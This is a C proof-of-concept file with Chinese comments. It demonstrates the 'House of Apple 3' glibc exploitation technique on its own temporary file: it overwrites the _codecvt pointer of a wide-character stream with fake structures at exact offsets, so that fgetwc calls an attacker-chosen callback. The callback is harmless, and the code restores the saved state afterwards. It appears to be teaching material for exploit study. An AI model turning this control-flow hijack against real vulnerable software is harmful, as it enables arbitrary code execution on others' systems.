#define _GNU_SOURCE
/*
 * 手法：House of Apple 3 codecvt 最终触发点；适用 glibc 2.31～2.43，x86-64。
 *
 * 模拟漏洞：攻击者能覆盖一个宽字符 FILE 的 `_codecvt` 指针。primary
 * vtable 仍是 glibc 建立的合法 `_IO_wfile_jumps`，所以 2.24 起的窄 vtable
 * 白名单不会阻止下面的调用链：
 *
 *   fgetwc(fp)
 *     -> 宽流下溢：_IO_wfile_underflow
 *     -> 转换入口：__libio_codecvt_in
 *     -> 伪造回调：fake codecvt->__cd_in.step->__fct(...)
 *     -> 成功回调：apple3_callback
 *
 * 2.31 起 `_IO_iconv_t` 的开头是 `step` 指针，后接 step_data；本文件用
 * `codecvt+0x0 -> fake step`。2.23～2.30 的旧 union 布局请使用另一份 PoC。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

static int callback_count;
static void *expected_step;

/* `__gconv_fct` 的 x86-64 调用约定。用 void * 表示 glibc 私有结构，避免
   把某个发行版的私有头文件复制进教学 PoC。 */
static int apple3_callback(void *step, void *step_data,
                           const unsigned char **inbuf,
                           const unsigned char *inbufend,
                           unsigned char **outbufstart,
                           size_t *irreversible,
                           int do_flush, int consume_incomplete)
{
    (void)outbufstart;
    (void)irreversible;
    (void)do_flush;
    (void)consume_incomplete;

    callback_count++;
    assert(step == expected_step);

    /* step_data 的前两个字段是 __outbuf/__outbufend。glibc 在调用前已经
       把它们设成 wide buffer；写一个字符并推进指针，令 underflow 返回。 */
    unsigned char **outbuf = (unsigned char **)step_data;
    unsigned char *outbufend = *((unsigned char **)step_data + 1);
    assert(*outbuf + sizeof(wchar_t) <= outbufend);
    *(wchar_t *)(*outbuf) = L'3';
    *outbuf += sizeof(wchar_t);

    if (inbuf != NULL && *inbuf != NULL)
        *inbuf = inbufend;
    return 0; /* 返回状态 __GCONV_OK。 */
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    FILE *fp = tmpfile();
    assert(fp != NULL);
    assert(fwide(fp, 1) > 0); /* 初始化真实 wide_data 与合法 wfile vtable。 */

    void **codecvt_slot = (void **)((char *)fp + 0x98);
    void *saved_codecvt = *codecvt_slot;
    void *wide_data = *(void **)((char *)fp + 0xa0);
    assert(saved_codecvt != NULL && wide_data != NULL);

    /* 保存本次 underflow 会改到的 FILE/wide_data 字段，触发后恢复再 fclose。 */
    int saved_flags = fp->_flags;
    char *saved_read_ptr = fp->_IO_read_ptr;
    char *saved_read_end = fp->_IO_read_end;
    char *saved_read_base = fp->_IO_read_base;
    char *saved_write_base = fp->_IO_write_base;
    char *saved_write_ptr = fp->_IO_write_ptr;
    char *saved_write_end = fp->_IO_write_end;
    unsigned char saved_wide_prefix[0x80];
    memcpy(saved_wide_prefix, wide_data, sizeof(saved_wide_prefix));

    uint64_t fake_codecvt[0x100 / 8] __attribute__((aligned(0x10)));
    uint64_t fake_step[0x80 / 8] __attribute__((aligned(0x10)));
    wchar_t wide_output[8];
    char external_input = 'A';
    memset(fake_codecvt, 0, sizeof(fake_codecvt));
    memset(fake_step, 0, sizeof(fake_step));
    memset(wide_output, 0, sizeof(wide_output));

    /* glibc 2.31～2.43：codecvt->__cd_in.step 位于 +0x0。
       __gconv_step.__shlib_handle(+0x0)=NULL 可避免 PTR_DEMANGLE；__fct 在+0x28。 */
    fake_codecvt[0x00 / 8] = (uintptr_t)fake_step;
    fake_step[0x00 / 8] = 0;
    fake_step[0x28 / 8] = (uintptr_t)apple3_callback;
    expected_step = fake_step;
    *codecvt_slot = fake_codecvt;

    /* 先让 wide 缓冲为空，再让窄 external buffer 留一个字节；underflow 会
       直接进入 codecvt_in，而不需要执行真实 read 系统调用。 */
    uintptr_t *wide = (uintptr_t *)wide_data;
    wide[0x00 / 8] = (uintptr_t)wide_output; /* 宽流字段 read_ptr。 */
    wide[0x08 / 8] = (uintptr_t)wide_output; /* 宽流字段 read_end。 */
    wide[0x10 / 8] = (uintptr_t)wide_output; /* 宽流字段 read_base。 */
    wide[0x30 / 8] = (uintptr_t)wide_output; /* 宽流字段 buf_base。 */
    wide[0x38 / 8] = (uintptr_t)(wide_output + 8); /* 宽流字段 buf_end。 */
    fp->_IO_read_base = &external_input;
    fp->_IO_read_ptr = &external_input;
    fp->_IO_read_end = &external_input + 1;
    fp->_flags &= ~(0x10 | 0x4); /* 清 EOF_SEEN 与 NO_READS。 */

    wint_t result = fgetwc(fp);
    assert(result == L'3');
    assert(callback_count == 1);

    *codecvt_slot = saved_codecvt;
    fp->_flags = saved_flags;
    fp->_IO_read_ptr = saved_read_ptr;
    fp->_IO_read_end = saved_read_end;
    fp->_IO_read_base = saved_read_base;
    fp->_IO_write_base = saved_write_base;
    fp->_IO_write_ptr = saved_write_ptr;
    fp->_IO_write_end = saved_write_end;
    memcpy(wide_data, saved_wide_prefix, sizeof(saved_wide_prefix));
    fclose(fp);

    puts("[+] Apple3：gconv 回调命中");
    return 0;
}
